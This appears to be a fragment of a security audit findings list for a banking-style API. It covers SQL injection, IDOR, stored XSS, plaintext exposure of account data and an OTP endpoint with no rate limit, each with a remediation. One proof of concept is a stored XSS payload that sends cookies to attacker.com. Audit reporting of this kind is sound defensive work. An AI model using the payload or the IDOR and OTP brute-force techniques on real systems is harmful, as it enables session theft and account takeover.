remediation: Implement parameterized queries, input validation, and WAF rules for SQL injection.

finding_title: IDOR - Access Other Users Account Details
poc: GET /api/v2/accounts/10001 returns data for authenticated user, GET /api/v2/accounts/10002 also returns data (different user)
Stored payload <script>document.location='https://attacker.com?c='+document.cookie</script> in transaction note executes when viewed by victim.
remediation: Implement output encoding, Content Security Policy headers.

poc: GET /api/v2/profile returns full account number, CVV equivalent data in plaintext JSON response.
remediation: Mask sensitive data in API responses. Return only necessary fields.

finding_title: Missing Rate Limiting on OTP Endpoint
poc: OTP endpoint allows unlimited guesses. 6-digit OTP bruteforceable in minutes.
remediation: Implement rate limiting, account lockout after N failed OTP attempts.
